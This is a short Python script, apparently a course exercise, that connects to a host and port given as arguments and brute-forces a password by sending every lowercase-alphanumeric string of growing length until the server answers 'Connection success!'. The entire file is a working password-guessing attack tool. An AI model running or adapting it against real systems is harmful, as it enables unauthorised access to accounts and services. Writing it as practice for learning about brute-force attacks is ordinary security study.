# write your code here
import socket
from itertools import product, count
from string import ascii_lowercase, digits
from sys import argv


class Hack:
    def __init__(self, args):
        self.conn = None
        self.ip = args[1]
        self.port = int(args[2])

    @staticmethod
    def generate_password():
        while True:
            for n in count(1):
                yield from product(ascii_lowercase + digits, repeat=n)

    def open_socket(self):
        with socket.socket() as self.conn:
            address = self.ip, self.port
            self.conn.connect(address)
            self.send_data()

    def send_data(self):
        for i in self.generate_password():
            _pass = ''.join(i)
            data = _pass.encode()
            self.conn.send(data)
            response = self.conn.recv(1024)
            if response.decode() == 'Connection success!':
                print(_pass)
                break


Hack(argv).open_socket()